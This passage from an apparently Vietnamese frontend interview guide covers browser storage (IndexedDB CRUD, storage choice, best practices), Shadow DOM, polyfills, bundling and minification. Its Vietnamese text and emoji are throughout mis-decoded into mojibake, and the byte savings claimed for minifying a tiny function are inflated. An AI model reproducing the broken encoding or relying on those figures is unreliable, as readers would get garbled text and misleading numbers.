    request.onerror = () => reject(request.error);
  });
}

// 5ï¸âƒ£ Cáº¬P NHáº¬T (UPDATE)
async function updateUser(db: IDBDatabase, user: any): Promise<void> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readwrite');
    const store = tx.objectStore('users');
    
    const request = store.put(user); // put = thÃªm hoáº·c update
    
    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

// 6ï¸âƒ£ XÃ“A (DELETE)
async function deleteUser(db: IDBDatabase, id: number): Promise<void> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readwrite');
    const store = tx.objectStore('users');
    
    const request = store.delete(id);
    
    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

// ============================================
// USAGE - Sá»­ Dá»¥ng Thá»±c Táº¿
// ============================================
async function demo() {
  // Má»Ÿ database
  const db = await openDB('MyAppDB', 1);
  
  // ThÃªm users
  await addUser(db, { id: 1, name: 'John', email: 'john@example.com' });
  await addUser(db, { id: 2, name: 'Jane', email: 'jane@example.com' });
  
  // Äá»c 1 user
  const user = await getUser(db, 1);
  console.log(user); // { id: 1, name: 'John', email: 'john@example.com' }
  
  // Äá»c táº¥t cáº£ users
  const users = await getAllUsers(db);
  console.log(users); // [{ id: 1, ... }, { id: 2, ... }]
  
  // Update user
  await updateUser(db, { id: 1, name: 'John Doe', email: 'john@example.com' });
  
  // XÃ³a user
  await deleteUser(db, 2);
  
  // ÄÃ³ng database
  db.close();
}

demo();

// ============================================
// Use Case Thá»±c Táº¿: Offline App
// ============================================
class OfflineCache {
  private db: IDBDatabase | null = null;
  
  async init() {
    this.db = await openDB('OfflineCache', 1);
  }
  
  // Cache API response
  async cacheArticle(article: any) {
    if (!this.db) return;
    await addUser(this.db, article);
  }
  
  // Get tá»« cache
  async getArticle(id: number) {
    if (!this.db) return null;
    return await getUser(this.db, id);
  }
}

// Usage:
const cache = new OfflineCache();
await cache.init();

// Online: Fetch tá»« API + cache
const article = await fetch('/api/article/1').then(r => r.json());
await cache.cacheArticle(article);

// Offline: Äá»c tá»« cache
const cached = await cache.getArticle(1);
```

---

#### **ğŸ¯ Khi NÃ o DÃ¹ng Storage NÃ o?**

```typescript
// ============================================
// DECISION TREE - Chá»n Storage PhÃ¹ Há»£p
// ============================================

function selectStorage(requirement: Requirement): Storage {
  // 1. Cáº§n gá»­i server? â†’ Cookie
  if (requirement.sendToServer) {
    return 'Cookie'; // Auth tokens, session IDs
  }
  
  // 2. Data lá»›n (>5MB)? â†’ IndexedDB
  if (requirement.size > 5_000_000) {
    return 'IndexedDB'; // Images, videos, large datasets
  }
  
  // 3. Cáº§n persistent (lÆ°u mÃ£i mÃ£i)? â†’ LocalStorage
  if (requirement.persistent) {
    return 'LocalStorage'; // Settings, preferences, cart
  }
  
  // 4. Temporary (Ä‘Ã³ng tab = máº¥t)? â†’ SessionStorage
  if (requirement.temporary) {
    return 'SessionStorage'; // Form drafts, wizard steps
  }
  
  // Default: LocalStorage
  return 'LocalStorage';
}

// ============================================
// Use Cases Thá»±c Táº¿
// ============================================

// âœ… Cookie:
// - Authentication tokens (JWT)
// - Session IDs
// - User tracking, analytics

// âœ… LocalStorage:
// - User settings (theme, language)
// - Shopping cart
// - Cached data (API responses)
// - Recently viewed items

// âœ… SessionStorage:
// - Multi-step form data
// - Wizard progress
// - Search filters (per-tab)
// - Temporary state

// âœ… IndexedDB:
// - Offline apps (PWA)
// - Large datasets (1000+ items)
// - Images, videos
// - Full-text search indexes
```

---

#### **ğŸ“‹ Best Practices (Thá»±c HÃ nh Tá»‘t)**

```typescript
// 1ï¸âƒ£ ALWAYS TRY-CATCH (storage cÃ³ thá»ƒ full hoáº·c disabled)
function safeSetItem(key: string, value: any) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (error) {
    if (error instanceof DOMException && error.name === 'QuotaExceededError') {
      console.error('Storage full!');
      // Clear old data hoáº·c notify user
    }
  }
}

// 2ï¸âƒ£ CHECK AVAILABILITY
function isLocalStorageAvailable(): boolean {
  try {
    const test = '__test__';
    localStorage.setItem(test, test);
    localStorage.removeItem(test);
    return true;
  } catch {
    return false; // User disabled hoáº·c browser khÃ´ng support
  }
}

// 3ï¸âƒ£ NAMESPACE KEYS (trÃ¡nh conflict)
const STORAGE_PREFIX = 'myapp_';

function setAppData(key: string, value: any) {
  localStorage.setItem(STORAGE_PREFIX + key, JSON.stringify(value));
}

function getAppData(key: string) {
  const item = localStorage.getItem(STORAGE_PREFIX + key);
  return item ? JSON.parse(item) : null;
}

// Usage:
setAppData('user', { name: 'John' }); // LÆ°u: "myapp_user"

// 4ï¸âƒ£ VERSIONING (Ä‘á»ƒ migration)
interface StorageData<T> {
  version: number;
  data: T;
}

function setVersionedData<T>(key: string, data: T, version: number = 1) {
  const wrapper: StorageData<T> = { version, data };
  localStorage.setItem(key, JSON.stringify(wrapper));
}

function getVersionedData<T>(key: string, currentVersion: number): T | null {
  const item = localStorage.getItem(key);
  if (!item) return null;
  
  const wrapper: StorageData<T> = JSON.parse(item);
  
  if (wrapper.version !== currentVersion) {
    // Migration logic here
    console.warn('Old data version, migrating...');
    return null;
  }
  
  return wrapper.data;
}

// 5ï¸âƒ£ EXPIRY for LocalStorage (giá»‘ng cookie)
interface CachedData<T> {
  data: T;
  expiry: number; // timestamp
}

function setWithExpiry<T>(key: string, value: T, ttlMs: number) {
  const item: CachedData<T> = {
    data: value,
    expiry: Date.now() + ttlMs,
  };
  localStorage.setItem(key, JSON.stringify(item));
}

function getWithExpiry<T>(key: string): T | null {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null;
  
  const item: CachedData<T> = JSON.parse(itemStr);
  
  // Check expiry
  if (Date.now() > item.expiry) {
    localStorage.removeItem(key); // Expired, xÃ³a Ä‘i
    return null;
  }
  
  return item.data;
}

// Usage: Cache API response trong 1 giá»
setWithExpiry('apiCache', { users: [...] }, 60 * 60 * 1000); // 1 hour

const cached = getWithExpiry('apiCache');
if (cached) {
  console.log('Use cache');
} else {
  console.log('Cache expired, fetch new');
}
```

---

#### **âŒ Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p)**

```typescript
// âŒ Lá»–I 1: LÆ°u object trá»±c tiáº¿p (khÃ´ng stringify)
localStorage.setItem('user', { name: 'John' }); // âŒ LÆ°u "[object Object]"

// âœ… ÄÃšNG: Stringify trÆ°á»›c
localStorage.setItem('user', JSON.stringify({ name: 'John' }));

// âŒ Lá»–I 2: QuÃªn parse khi Ä‘á»c
const user = localStorage.getItem('user'); // âŒ user lÃ  string!
console.log(user.name); // undefined

// âœ… ÄÃšNG: Parse sau khi Ä‘á»c
const userStr = localStorage.getItem('user');
const user = userStr ? JSON.parse(userStr) : null;
console.log(user?.name); // "John"

// âŒ Lá»–I 3: LÆ°u sensitive data vÃ o localStorage
localStorage.setItem('password', 'secret123'); // âŒ KhÃ´ng secure!

// âœ… ÄÃšNG: Chá»‰ lÆ°u non-sensitive data
// Sensitive data (passwords, credit cards) â†’ server session hoáº·c httpOnly cookie

// âŒ Lá»–I 4: KhÃ´ng check quota exceeded
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key${i}`, 'x'.repeat(1000)); // âŒ CÃ³ thá»ƒ full!
}

// âœ… ÄÃšNG: Try-catch
try {
  localStorage.setItem('key', largeData);
} catch (error) {
  if (error.name === 'QuotaExceededError') {
    console.error('Storage full, clearing old data');
    localStorage.clear();
  }
}

// âŒ Lá»–I 5: DÃ¹ng IndexedDB cho data nhá»
await openDB(...); // âŒ Overkill cho lÆ°u 1 string
await addUser(db, { name: 'John' });

// âœ… ÄÃšNG: LocalStorage cho data nhá»
localStorage.setItem('name', 'John'); // ÄÆ¡n giáº£n hÆ¡n nhiá»u

// âŒ Lá»–I 6: QuÃªn Ä‘Ã³ng IndexedDB connection
const db = await openDB('MyDB', 1);
// ... use db
// âŒ KhÃ´ng Ä‘Ã³ng â†’ memory leak

// âœ… ÄÃšNG: LuÃ´n Ä‘Ã³ng
const db = await openDB('MyDB', 1);
try {
  // ... use db
} finally {
  db.close(); // Always close
}
```

---

#### **ğŸ’¡ Summary (TÃ³m Táº¯t)**

**Cookie ğŸª**
- **4KB**, gá»­i kÃ¨m má»i request, cÃ³ expiry
- **DÃ¹ng cho**: Auth tokens, session IDs
- **API**: `document.cookie`

**LocalStorage ğŸ’¾**
- **5-10MB**, lÆ°u mÃ£i mÃ£i, sync API
- **DÃ¹ng cho**: Settings, preferences, cart
- **API**: `localStorage.getItem/setItem`

**SessionStorage ğŸ“**
- **5-10MB**, máº¥t khi Ä‘Ã³ng tab, sync API
- **DÃ¹ng cho**: Form drafts, temporary state
- **API**: `sessionStorage.getItem/setItem`

**IndexedDB ğŸ—„ï¸**
- **50MB+**, async, database-like
- **DÃ¹ng cho**: Large datasets, offline apps
- **API**: `indexedDB.open`, transactions, objectStores

**Key Takeaway:**
- Data nhá» + simple â†’ **LocalStorage/SessionStorage**
- Gá»­i server â†’ **Cookie**
- Data lá»›n + complex â†’ **IndexedDB**
- LuÃ´n **try-catch**, **check availability**, **namespace keys**

---
</details>



<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ­ Q41: Shadow DOM & Custom Elements</span></summary>


**Tráº£ lá»i:**

- Shadow DOM: cÃ´ láº­p DOM/CSS; Custom Elements: Ä‘á»‹nh nghÄ©a tháº» má»›i

**Code Example:**

```ts
class MyBadge extends HTMLElement {
  shadow = this.attachShadow({ mode: 'open' });
  connectedCallback() {
    this.shadow.innerHTML = `
      <style>:host{display:inline-block;padding:2px 6px;background:#eef;border-radius:12px}</style>
      <slot></slot>
    `;
  }
}
customElements.define('my-badge', MyBadge);
```

**Best Practices:**

- DÃ¹ng `:host` vÃ  CSS parts/slots; trÃ¡nh rÃ² rá»‰ style global

**Mistakes:**

```ts
// âŒ TrÃ´ng chá» CSS global tÃ¡c Ä‘á»™ng vÃ o shadow tree
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”§ Q42: Polyfill & Transpiling</span></summary>


**âš¡ Quick Summary:**
> Polyfill = code thay tháº¿ feature chÆ°a há»— trá»£. Transpiling = convert modern â†’ old JS (Babel)

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ”§ **Polyfill**: Add missing features (Array.includes, Promise...)
- ğŸ”„ **Transpile**: ES6+ â†’ ES5 (Babel, TypeScript)
- ğŸ“¦ **Bundle**: core-js, @babel/polyfill

**Tráº£ lá»i:**

- **Polyfill**: Code cung cáº¥p functionality cho older browsers khÃ´ng support feature má»›i
- **Transpiling**: Convert code tá»« syntax nÃ y sang syntax khÃ¡c (ES6+ â†’ ES5)
- **Hoáº¡t Ä‘á»™ng**: Polyfill thÃªm methods/APIs, Transpiling convert syntax
- **Æ¯u Ä‘iá»ƒm**: Browser compatibility, modern development
- **NhÆ°á»£c Ä‘iá»ƒm**: Bundle size tÄƒng, complexity

**Code Example:**

```typescript
// Polyfill cho Array.includes (ES2016)
if (!Array.prototype.includes) {
  Array.prototype.includes = function (
    searchElement: any,
    fromIndex?: number
  ): boolean {
    const O = Object(this);
    const len = parseInt(O.length) || 0;
    if (len === 0) return false;

    const n = parseInt(fromIndex) || 0;
    let k = n >= 0 ? n : Math.max(len + n, 0);

    while (k < len) {
      if (O[k] === searchElement) return true;
      k++;
    }
    return false;
  };
}

// Polyfill cho Promise (ES2015)
if (!window.Promise) {
  window.Promise = class Promise {
    private state: 'pending' | 'fulfilled' | 'rejected' = 'pending';
    private value: any;
    private reason: any;
    private onFulfilledCallbacks: Function[] = [];
    private onRejectedCallbacks: Function[] = [];

    constructor(executor: (resolve: Function, reject: Function) => void) {
      const resolve = (value: any) => {
        if (this.state === 'pending') {
          this.state = 'fulfilled';
          this.value = value;
          this.onFulfilledCallbacks.forEach((callback) => callback(value));
        }
      };

      const reject = (reason: any) => {
        if (this.state === 'pending') {
          this.state = 'rejected';
          this.reason = reason;
          this.onRejectedCallbacks.forEach((callback) => callback(reason));
        }
      };

      try {
        executor(resolve, reject);
      } catch (error) {
        reject(error);
      }
    }

    then(onFulfilled?: Function, onRejected?: Function): Promise {
      return new Promise((resolve, reject) => {
        if (this.state === 'fulfilled') {
          try {
            const result = onFulfilled ? onFulfilled(this.value) : this.value;
            resolve(result);
          } catch (error) {
            reject(error);
          }
        } else if (this.state === 'rejected') {
          try {
            const result = onRejected ? onRejected(this.reason) : this.reason;
            resolve(result);
          } catch (error) {
            reject(error);
          }
        } else {
          this.onFulfilledCallbacks.push(
            onFulfilled || ((value: any) => resolve(value))
          );
          this.onRejectedCallbacks.push(
            onRejected || ((reason: any) => reject(reason))
          );
        }
      });
    }
  };
}

// Transpiling: ES6+ â†’ ES5
// ES6+ Code
const greet = (name: string): string => `Hello ${name}`;
const numbers = [1, 2, 3, 4, 5];
const doubled = numbers.map((n) => n * 2);

// Transpiled ES5 Code
var greet = function (name) {
  return 'Hello ' + name;
};
var numbers = [1, 2, 3, 4, 5];
var doubled = numbers.map(function (n) {
  return n * 2;
});

// Khi nÃ o cáº§n viáº¿t polyfill
function needsPolyfill(): boolean {
  // Check if feature exists
  if (!Array.prototype.includes) {
    console.log('Array.includes needs polyfill');
    return true;
  }

  if (!window.fetch) {
    console.log('Fetch API needs polyfill');
    return true;
  }

  if (!Object.assign) {
    console.log('Object.assign needs polyfill');
    return true;
  }

  return false;
}
```

**Best Practices:**

- Sá»­ dá»¥ng polyfill cho missing APIs
- Sá»­ dá»¥ng Babel cho transpiling
- Sá»­ dá»¥ng core-js cho comprehensive polyfills
- Sá»­ dá»¥ng feature detection

**Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng check feature support
const result = [1, 2, 3].includes(2); // Error in IE

// âœ… ÄÃºng: Check feature support
if (Array.prototype.includes) {
  const result = [1, 2, 3].includes(2);
} else {
  // Use alternative or polyfill
  const result = [1, 2, 3].indexOf(2) !== -1;
}
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ—ï¸ Q44: Tooling: Bundling, Minify, Tree-shaking, Code Splitting, ESLint/Prettier, Source Maps</span></summary>


**â“ CÃ¢u Há»i:**

Giáº£i thÃ­ch chi tiáº¿t cÃ¡c cÃ´ng cá»¥ vÃ  ká»¹ thuáº­t tá»‘i Æ°u hÃ³a trong frontend development: Bundling (gá»™p file), Minify (nÃ©n code), Tree-shaking (loáº¡i bá» code thá»«a), Code splitting (tÃ¡ch code), ESLint/Prettier, vÃ  Source Maps. Bao gá»“m cÃ¡ch hoáº¡t Ä‘á»™ng, Æ°u nhÆ°á»£c Ä‘iá»ƒm, vÃ  á»©ng dá»¥ng thá»±c táº¿.



**ğŸ“š Pháº§n 1: Bundling (Gá»™p File) - Tá»« Nhiá»u Files â†’ 1 File**

#### **ğŸ’¡ Bundling LÃ  GÃ¬? (What is Bundling?)**

**Bundling** lÃ  quÃ¡ trÃ¬nh **gá»™p nhiá»u files JavaScript/CSS/assets** thÃ nh **Ã­t files hÆ¡n** (thÆ°á»ng lÃ  1 file duy nháº¥t) Ä‘á»ƒ gá»­i lÃªn browser.

**ğŸ”¥ Táº¡i Sao Cáº§n Bundling?**

```typescript
// ===================================================
// âŒ KHÃ”NG DÃ™NG BUNDLING - Website cÃ³ 100 files
// ===================================================

// index.html
<!DOCTYPE html>
<html>
<head>
  <!-- âŒ Load 100 files riÃªng biá»‡t! -->
  <script src="/js/utils.js"></script>
  <script src="/js/api.js"></script>
  <script src="/js/auth.js"></script>
  <script src="/js/components/Button.js"></script>
  <script src="/js/components/Input.js"></script>
  <!-- ...95 files khÃ¡c -->
</head>
</html>

// ğŸš¨ Váº¤N Äá»€:
// âŒ 100 HTTP requests â†’ Cá»°C CHáº¬M! (má»—i request cÃ³ latency ~50-100ms)
// âŒ Total latency: 100 files Ã— 100ms = 10 giÃ¢y chá»‰ Ä‘á»ƒ load files! ğŸ˜±
// âŒ HTTP/1.1: Chá»‰ 6-8 connections Ä‘á»“ng thá»i â†’ pháº£i chá» tá»«ng wave
// âŒ KhÃ´ng optimize Ä‘Æ°á»£c (khÃ´ng minify, tree-shake Ä‘Æ°á»£c)

// ===================================================
// âœ… DÃ™NG BUNDLING - Gá»™p thÃ nh 1 file
// ===================================================

// index.html
<!DOCTYPE html>
<html>
<head>
  <!-- âœ… Load 1 file duy nháº¥t! -->
  <script src="/js/bundle.js"></script>
</head>
</html>

// bundle.js (gá»™p 100 files thÃ nh 1)
// - Chá»©a táº¥t cáº£ code tá»« 100 files
// - ÄÃ£ minify (nÃ©n nhá» hÆ¡n)
// - ÄÃ£ tree-shake (loáº¡i code thá»«a)

// âœ… Lá»¢I ÃCH:
// âœ… 1 HTTP request â†’ NHANH HÆ N 100x!
// âœ… Latency: 1 file Ã— 100ms = 100ms (vs 10 giÃ¢y)
// âœ… CÃ³ thá»ƒ optimize (minify, compress, cache)
```

**ğŸ¯ CÃ¡ch Hoáº¡t Äá»™ng Cá»§a Bundler:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚               BUNDLING PROCESS (QUY TRÃŒNH Gá»˜P FILE)      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                          â”‚
â”‚  ğŸ“ INPUT: Source files (nhiá»u files)                   â”‚
â”‚  â”œâ”€â”€ src/                                               â”‚
â”‚  â”‚   â”œâ”€â”€ index.js        (10 KB)   â† Entry point       â”‚
â”‚  â”‚   â”œâ”€â”€ utils.js        (5 KB)                         â”‚
â”‚  â”‚   â”œâ”€â”€ api.js          (8 KB)                         â”‚
â”‚  â”‚   â””â”€â”€ components/                                    â”‚
â”‚  â”‚       â”œâ”€â”€ Button.js   (3 KB)                         â”‚
â”‚  â”‚       â””â”€â”€ Input.js    (4 KB)                         â”‚
â”‚  â”‚                                                       â”‚
â”‚  â”‚   Total: 5 files, 30 KB                             â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     â”‚
â”‚                                                          â”‚
â”‚  ğŸ” STEP 1: Dependency Resolution (PhÃ¢n tÃ­ch phá»¥ thuá»™c) â”‚
â”‚  â”œâ”€â”€ Bundler Ä‘á»c index.js (entry point)                â”‚
â”‚  â”œâ”€â”€ TÃ¬m táº¥t cáº£ imports/requires trong index.js        â”‚
â”‚  â”œâ”€â”€ Äá»‡ quy tÃ¬m imports trong utils.js, api.js, ...    â”‚
â”‚  â””â”€â”€ Táº¡o dependency graph (sÆ¡ Ä‘á»“ phá»¥ thuá»™c):           â”‚
â”‚      index.js                                           â”‚
â”‚        â”œâ”€ utils.js                                      â”‚
â”‚        â”œâ”€ api.js                                        â”‚
â”‚        â”‚   â””â”€ utils.js (Ä‘Ã£ cÃ³, skip)                   â”‚
â”‚        â””â”€ components/                                   â”‚
â”‚            â”œâ”€ Button.js                                 â”‚
â”‚            â””â”€ Input.js                                  â”‚
â”‚                                                          â”‚
â”‚  ğŸ”„ STEP 2: Transform (Biáº¿n Ä‘á»•i code)                  â”‚
â”‚  â”œâ”€â”€ TypeScript â†’ JavaScript (náº¿u dÃ¹ng TS)             â”‚
â”‚  â”œâ”€â”€ JSX â†’ JavaScript (náº¿u dÃ¹ng React)                 â”‚
â”‚  â”œâ”€â”€ ES6+ â†’ ES5 (náº¿u cáº§n há»— trá»£ IE11)                  â”‚
â”‚  â””â”€â”€ CSS Modules â†’ Scoped CSS                          â”‚
â”‚                                                          â”‚
â”‚  ğŸŒ² STEP 3: Tree Shaking (Loáº¡i code thá»«a)             â”‚
â”‚  â”œâ”€â”€ PhÃ¢n tÃ­ch exports/imports                         â”‚
â”‚  â”œâ”€â”€ Loáº¡i bá» functions/variables khÃ´ng dÃ¹ng           â”‚
â”‚  â””â”€â”€ 30 KB â†’ 22 KB (loáº¡i 8 KB code thá»«a)              â”‚
â”‚                                                          â”‚
â”‚  ğŸ“¦ STEP 4: Bundle (Gá»™p files)                         â”‚
â”‚  â”œâ”€â”€ Gá»™p táº¥t cáº£ files thÃ nh 1 file                     â”‚
â”‚  â”œâ”€â”€ Wrap má»—i module trong function scope              â”‚
â”‚  â””â”€â”€ 22 KB code trong 1 file: bundle.js                â”‚
â”‚                                                          â”‚
â”‚  ğŸ—œï¸ STEP 5: Minify (NÃ©n code)                          â”‚
â”‚  â”œâ”€â”€ Remove whitespace, comments                       â”‚
â”‚  â”œâ”€â”€ Shorten variable names (userName â†’ a)            â”‚
â”‚  â”œâ”€â”€ Remove unused code                                â”‚
â”‚  â””â”€â”€ 22 KB â†’ 8 KB (nÃ©n 64%!)                           â”‚
â”‚                                                          â”‚
â”‚  ğŸ“¤ OUTPUT: Bundle file (1 file duy nháº¥t)              â”‚
â”‚  â””â”€â”€ dist/                                              â”‚
â”‚      â””â”€â”€ bundle.min.js   (8 KB)  â† 1 file tá»‘i Æ°u!     â”‚
â”‚                                                          â”‚
â”‚  âœ… Káº¾T QUáº¢: 5 files (30 KB) â†’ 1 file (8 KB)          â”‚
â”‚  âœ… Giáº£m 73% kÃ­ch thÆ°á»›c!                                â”‚
â”‚  âœ… Giáº£m tá»« 5 HTTP requests â†’ 1 request!               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ğŸ’» Code Example - TrÆ°á»›c vÃ  Sau Bundling:**

```typescript
// ===================================================
// ğŸ“ TRÆ¯á»šC BUNDLING - Nhiá»u files riÃªng biá»‡t
// ===================================================

// src/utils.js
export function add(a, b) {
  return a + b;
}

export function subtract(a, b) {
  return a - b;
}

// src/api.js
import { add } from './utils.js';

export async function fetchData() {
  const response = await fetch('/api/data');
  const data = await response.json();
  return add(data.count, 10); // DÃ¹ng add tá»« utils
}

// src/index.js (Entry point)
import { fetchData } from './api.js';
import { subtract } from './utils.js';

async function main() {
  const result = await fetchData();
  const final = subtract(result, 5);
  console.log(final);
}

main();

// ===================================================
// ğŸ“¦ SAU BUNDLING - 1 file duy nháº¥t (bundle.js)
// ===================================================

// dist/bundle.js (Simplified version - thá»±c táº¿ phá»©c táº¡p hÆ¡n)
(function() {
  // Module: utils.js
  const utils = {
    add: function(a, b) { return a + b; },
    subtract: function(a, b) { return a - b; }
  };
  
  // Module: api.js
  const api = {
    fetchData: async function() {
      const response = await fetch('/api/data');
      const data = await response.json();
      return utils.add(data.count, 10);
    }
  };
  
  // Module: index.js (Entry)
  async function main() {
    const result = await api.fetchData();
    const final = utils.subtract(result, 5);
    console.log(final);
  }
  
  main();
})();

// âœ… Táº¥t cáº£ code trong 1 file!
// âœ… Modules Ä‘Æ°á»£c wrap trong function scope (trÃ¡nh global pollution)
// âœ… Dependencies Ä‘Æ°á»£c resolve (utils, api, index)
```

---

**ğŸ“š Pháº§n 2: Minify (NÃ©n Code) - LÃ m Code Nhá» Gá»n**

#### **ğŸ’¡ Minify LÃ  GÃ¬? (What is Minification?)**

**Minify** lÃ  quÃ¡ trÃ¬nh **loáº¡i bá» táº¥t cáº£ kÃ½ tá»± khÃ´ng cáº§n thiáº¿t** khá»i code (whitespace, comments, newlines) vÃ  **rÃºt ngáº¯n tÃªn biáº¿n** Ä‘á»ƒ giáº£m kÃ­ch thÆ°á»›c file.

**ğŸ”¥ Minify LÃ m GÃ¬?**

```typescript
// ===================================================
// ğŸ“ TRÆ¯á»šC MINIFY - Code dá»… Ä‘á»c (10 KB)
// ===================================================

// Original code (readable - dá»… Ä‘á»c)
function calculateTotalPrice(items, taxRate, discount) {
  // Calculate subtotal - TÃ­nh tá»•ng tiá»n hÃ ng
  let subtotal = 0;
  
  for (let i = 0; i < items.length; i++) {
    const item = items[i];
    subtotal += item.price * item.quantity;
  }
  
  // Apply discount - Ãp dá»¥ng giáº£m giÃ¡
  const discountedPrice = subtotal * (1 - discount / 100);
  
  // Add tax - ThÃªm thuáº¿
  const tax = discountedPrice * (taxRate / 100);
  const total = discountedPrice + tax;
  
  return total;
}

// Exported function for external use
export { calculateTotalPrice };

// ===================================================
// ğŸ—œï¸ SAU MINIFY - Code khÃ³ Ä‘á»c nhÆ°ng NHá» (3 KB)
// ===================================================

// Minified code (unreadable - khÃ³ Ä‘á»c nhÆ°ng nhá»)
function c(a,b,d){let e=0;for(let f=0;f<a.length;f++){const g=a[f];e+=g.price*g.quantity}const h=e*(1-d/100),i=h*(b/100);return h+i}export{c};

// ğŸ¯ NHá»®NG GÃŒ ÄÃƒ THAY Äá»”I:
// âœ… Remove comments (// Calculate subtotal, etc.) â†’ Tiáº¿t kiá»‡m ~200 bytes
// âœ… Remove whitespace (spaces, tabs) â†’ Tiáº¿t kiá»‡m ~500 bytes
// âœ… Remove newlines â†’ Tiáº¿t kiá»‡m ~300 bytes
// âœ… Shorten variable names:
//    - calculateTotalPrice â†’ c
//    - items â†’ a
//    - taxRate â†’ b
//    - discount â†’ d
//    - subtotal â†’ e
//    - item â†’ g
//    - discountedPrice â†’ h
//    - tax â†’ i
// âœ… Remove unnecessary semicolons, braces â†’ Tiáº¿t kiá»‡m ~50 bytes
//
// ğŸ“Š Káº¾T QUáº¢: 10 KB â†’ 3 KB (Giáº£m 70%!)
```

**ğŸ”§ CÃ¡c Ká»¹ Thuáº­t Minify Chi Tiáº¿t:**

```typescript
// ===================================================
// ğŸ”§ Ká»¸ THUáº¬T 1: Remove Whitespace & Comments
// ===================================================

// Before (vá»›i whitespace, comments)
function add(a, b) {
  // This function adds two numbers
  return a + b; // Return sum
}

// After (remove whitespace, comments)
function add(a,b){return a+b}

// Tiáº¿t kiá»‡m: ~50 bytes

// ===================================================
// ğŸ”§ Ká»¸ THUáº¬T 2: Shorten Variable Names (Mangle)
// ===================================================

// Before (tÃªn biáº¿n dÃ i, cÃ³ nghÄ©a)
function calculateUserTotalScore(userAnswers, correctAnswers) {
  let totalScore = 0;
  for (let index = 0; index < userAnswers.length; index++) {
    if (userAnswers[index] === correctAnswers[index]) {
      totalScore += 10;
    }
  }
  return totalScore;
}

// After (tÃªn biáº¿n ngáº¯n - 1 kÃ½ tá»±)
function c(a,b){let d=0;for(let e=0;e<a.length;e++){if(a[e]===b[e]){d+=10}}return d}

// Tiáº¿t kiá»‡m: ~100 bytes

// âš ï¸ LÆ¯U Ã: Chá»‰ mangle LOCAL variables
// KHÃ”NG mangle exported names (Ä‘á»ƒ external code gá»i Ä‘Æ°á»£c)

// ===================================================
// ğŸ”§ Ká»¸ THUáº¬T 3: Optimize Boolean Logic
// ===================================================

// Before
if (user.isActive === true) {
  console.log('Active');
}

// After
if(user.isActive)console.log('Active')

// Before
const value = condition ? true : false;

// After
const value = !!condition; // Hoáº·c: value = condition

// ===================================================
// ğŸ”§ Ká»¸ THUáº¬T 4: Dead Code Elimination
// ===================================================

// Before
function process(data) {
  const temp = data * 2; // âŒ temp khÃ´ng dÃ¹ng
  const result = data + 10;
  return result;
}

// After (remove unused variable)
function process(a){return a+10}

// ===================================================
// ğŸ”§ Ká»¸ THUáº¬T 5: Constant Folding (Gá»™p háº±ng sá»‘)
// ===================================================

// Before
const total = 10 + 20 + 30; // TÃ­nh lÃºc runtime

// After
const total = 60; // TÃ­nh lÃºc build time

// Before
const area = Math.PI * 5 * 5; // TÃ­nh lÃºc runtime

// After
const area = 78.53981633974483; // TÃ­nh sáºµn lÃºc build

// ===================================================
// ğŸ”§ Ká»¸ THUáº¬T 6: Property Mangling (Advanced)
// ===================================================

// Before
const user = {
  firstName: 'John',
  lastName: 'Doe',
  calculateAge: function() { return 2024 - this.birthYear; }
};

// After (mangle property names - Cáº¨N THáº¬N!)
const user = {
  a: 'John',    // firstName â†’ a
  b: 'Doe',     // lastName â†’ b
  c: function() { return 2024 - this.d; } // calculateAge â†’ c
};

// âš ï¸ NGUY HIá»‚M: Náº¿u external code access user.firstName â†’ Bá»Š Lá»–I!
// â†’ Chá»‰ dÃ¹ng khi cháº¯c cháº¯n property KHÃ”NG Ä‘Æ°á»£c access tá»« bÃªn ngoÃ i
```

**ğŸ“Š Minify Performance Impact:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           MINIFY IMPACT (áº¢nh hÆ°á»Ÿng cá»§a Minify)          â”‚
